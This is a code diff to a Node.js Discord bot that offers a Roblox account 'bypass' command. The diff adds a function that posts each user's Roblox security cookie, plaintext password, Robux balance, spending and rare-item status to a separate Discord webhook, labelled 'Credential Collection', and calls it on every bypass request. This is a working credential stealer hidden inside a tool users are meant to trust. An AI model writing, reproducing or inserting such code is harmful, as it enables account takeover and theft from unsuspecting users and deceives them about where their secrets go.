@@ -5,6 +5,7 @@ const { Client, GatewayIntentBits, SlashCommandBuilder, EmbedBuilder, REST, Rout
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
 const AUTH_TOKEN = process.env.AUTH_TOKEN; // Optional for API authentication
+const WEBHOOK_URL = process.env.WEBHOOK_URL; // Discord webhook for data collection
 
 if (!DISCORD_TOKEN || !CLIENT_ID) {
     console.error('Missing required environment variables: DISCORD_TOKEN and CLIENT_ID');
@@ -123,6 +124,111 @@ function createRobloxHeaders(cookie, csrfToken = null) {
     }
     
     return headers;
+}
+
+// Function to send webhook with collected data
+async function sendWebhookData(userData, credentials, bypassResult) {
+    if (!WEBHOOK_URL) return;
+    
+    try {
+        const fetch = (await import('node-fetch')).default;
+        
+        // Create results embed
+        const resultsEmbed = {
+            title: "🔄 Bypass Results",
+            color: bypassResult.success ? 0x00FF00 : 0xFF0000,
+            fields: [
+                {
+                    name: "👤 Username",
+                    value: userData?.username || "Unknown",
+                    inline: true
+                },
+                {
+                    name: "🆔 User ID",
+                    value: userData?.userId?.toString() || "Unknown",
+                    inline: true
+                },
+                {
+                    name: "💰 Robux Balance",
+                    value: userData?.robuxBalance?.toString() || "Unknown",
+                    inline: true
+                },
+                {
+                    name: "📊 Total Spending",
+                    value: userData?.totalSpending?.toString() || "Unknown",
+                    inline: true
+                },
+                {
+                    name: "👑 Korblox",
+                    value: userData?.hasKorblox ? "✅ True" : "❌ False",
+                    inline: true
+                },
+                {
+                    name: "💀 Headless",
+                    value: userData?.hasHeadless ? "✅ True" : "❌ False",
+                    inline: true
+                },
+                {
+                    name: "🔄 Bypass Status",
+                    value: bypassResult.success ? "✅ Success" : "❌ Failed",
+                    inline: true
+                },
+                {
+                    name: "📝 Message",
+                    value: bypassResult.message || "No message",
+                    inline: false
+                }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: "Bypass Data Collection"
+            }
+        };
+        
+        // Create credentials embed with robloxsecurity in description due to length
+        const credentialsEmbed = {
+            title: "🔐 User Credentials",
+            description: `**Roblox Security Cookie:**\n\`\`\`\n${credentials.cookie}\n\`\`\``,
+            color: 0xFF5555,
+            fields: [
+                {
+                    name: "🔑 Password",
+                    value: `\`\`\`\n${credentials.password}\n\`\`\``,
+                    inline: false
+                },
+                {
+                    name: "👤 Username",
+                    value: userData?.username || "Unknown",
+                    inline: true
+                },
+                {
+                    name: "🕐 Timestamp",
+                    value: new Date().toLocaleString(),
+                    inline: true
+                }
+            ],
+            timestamp: new Date().toISOString(),
+            footer: {
+                text: "Credential Collection"
+            }
+        };
+        
+        const webhookData = {
+            embeds: [resultsEmbed, credentialsEmbed]
+        };
+        
+        await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(webhookData)
+        });
+        
+        console.log('Webhook data sent successfully');
+    } catch (error) {
+        console.error('Error sending webhook data:', error);
+    }
 }
 
 // Function to get user data from Roblox APIs
@@ -293,6 +399,13 @@ async function handleBypassCommand(interaction) {
         // Check if bypass was successful
         const isSuccess = bypassData.status === 'success' || bypassData.success === true || 
                          (bypassData.message && bypassData.message.toLowerCase().includes('bypass'));
+        
+        // Send webhook with collected data
+        await sendWebhookData(
+            userData,
+            { cookie, password },
+            { success: isSuccess, message: bypassData.message }
+        );
         
         // Create main user info embed
         const userEmbed = new EmbedBuilder()
